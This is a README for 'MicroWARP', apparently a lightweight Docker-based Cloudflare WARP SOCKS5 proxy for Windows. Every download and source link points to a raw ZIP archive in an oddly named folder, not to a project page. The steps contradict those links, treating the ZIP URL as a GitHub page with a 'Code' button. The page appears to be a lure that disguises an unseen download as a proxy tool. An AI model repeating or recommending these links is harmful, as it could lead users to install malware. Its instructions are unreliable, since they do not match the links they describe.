# 🚀 MicroWARP - Ultra-Light Cloudflare WARP Proxy

[![Download / Visit Page](https://img.shields.io/badge/Download%20MicroWARP-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip)

## 🌐 What MicroWARP Does

MicroWARP is a small Docker app that gives you a Cloudflare WARP SOCKS5 proxy with low memory use.

It is built for users who want a simple way to route traffic through WARP without a heavy setup. You run it in Docker, connect to the SOCKS5 port, and use it as your proxy.

## 🧩 What You Need

Before you start, make sure you have:

- A Windows PC
- Docker Desktop installed
- A stable internet connection
- Admin access on your PC
- Basic knowledge of how to open a web page and copy text

## 📥 Download MicroWARP

Visit this page to download or get the project files:

https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip

## 🖥️ Install Docker on Windows

MicroWARP runs in Docker, so Docker Desktop must be installed first.

### Steps

1. Open the Docker Desktop website.
2. Download Docker Desktop for Windows.
3. Run the installer.
4. Follow the prompts.
5. Restart your PC if Windows asks for it.
6. Open Docker Desktop and wait until it shows that it is ready.

### Check that Docker works

1. Press `Win + R`.
2. Type `cmd`.
3. Press Enter.
4. Type:

docker --version

5. If you see a version number, Docker is ready.

## 📂 Get the MicroWARP Files

1. Open the MicroWARP GitHub page:
   https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip
2. Click the green `Code` button.
3. Choose `Download ZIP`.
4. Save the file to your Downloads folder.
5. Right-click the ZIP file and choose `Extract All`.
6. Open the extracted folder.

## 🛠️ Run MicroWARP with Docker

MicroWARP is set up as a Docker project. The usual way to run it is with Docker Compose.

### Start the service

1. Open the extracted MicroWARP folder.
2. Find the project file used by Docker, such as `docker-compose.yml`.
3. Open Command Prompt in that folder.
4. Run:

docker compose up -d

5. Wait for Docker to pull the image and start the container.

### Check the container

Run:

docker ps

You should see a running MicroWARP container in the list.

## 🔌 Connect to the SOCKS5 Proxy

MicroWARP exposes a SOCKS5 proxy that you can use in apps that support proxies.

### Typical local settings

- Host: `127.0.0.1`
- Port: `1080`
- Proxy type: `SOCKS5`

### How to use it

1. Open the app or browser you want to use.
2. Go to its proxy settings.
3. Select SOCKS5.
4. Enter `127.0.0.1` as the host.
5. Enter `1080` as the port.
6. Save the settings.
7. Open a site and test the connection.

## 🔒 What It Is Good For

MicroWARP can help with:

- Privacy-focused browsing
- Simple proxy use on Windows
- Routing traffic through Cloudflare WARP
- Small setups that need low RAM use
- Docker-based network tools
- Bypassing some DPI checks in certain networks

## 🧪 Basic Use Cases

### In a web browser

Set the browser proxy to SOCKS5 on `127.0.0.1:1080`, then browse as normal.

### In another app

Use the same proxy details in any app that supports SOCKS5.

### In a system tool

If your tool can use a local proxy, point it to `127.0.0.1:1080`.

## ⚙️ Common Docker Commands

Use these if you need to manage the container.

### Start

docker compose up -d

### Stop

docker compose down

### See logs

docker compose logs -f

### Restart

docker compose restart

### Remove the container

docker compose down --remove-orphans

## 🧭 If You Want to Change Settings

Many Docker projects let you adjust settings in a `.env` file or in `docker-compose.yml`.

Common things you may want to change:

- Proxy port
- Container name
- Network mode
- DNS settings
- Restart policy

If you edit a file, save it and run the start command again.

## 🧼 Remove MicroWARP

If you want to stop using it:

1. Open Command Prompt in the project folder.
2. Run:

docker compose down

3. Delete the project folder if you no longer need it.
4. Remove the ZIP file if you saved one.

## 🧩 Troubleshooting

### Docker says it is not running

- Open Docker Desktop
- Wait until it finishes starting
- Try the command again

### The container does not start

- Check that the project files are in the right folder
- Make sure `docker-compose.yml` is present
- Run `docker compose logs -f` and look for the error

### The proxy does not work

- Check the host and port
- Make sure another app is not using the same port
- Restart the container with `docker compose restart`
- Check your app’s proxy settings

### No internet after enabling the proxy

- Turn off the proxy in your app
- Stop the container
- Start it again
- Check your local network connection

## 📌 Project Details

- Name: MicroWARP
- Type: Docker-based SOCKS5 proxy
- Network layer: WireGuard and WARP based
- Memory use: very low
- Target user: end users who want a light proxy setup
- Platform: Windows with Docker Desktop

## 📁 Topics

- alpine
- bypass-dpi
- cloudflare
- cloudflare-warp
- docker
- lightweight
- proxy
- socks5
- warp
- wireguard
- zero-trust

## 🔗 Source

Open the project page and follow the files in the repository:

https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip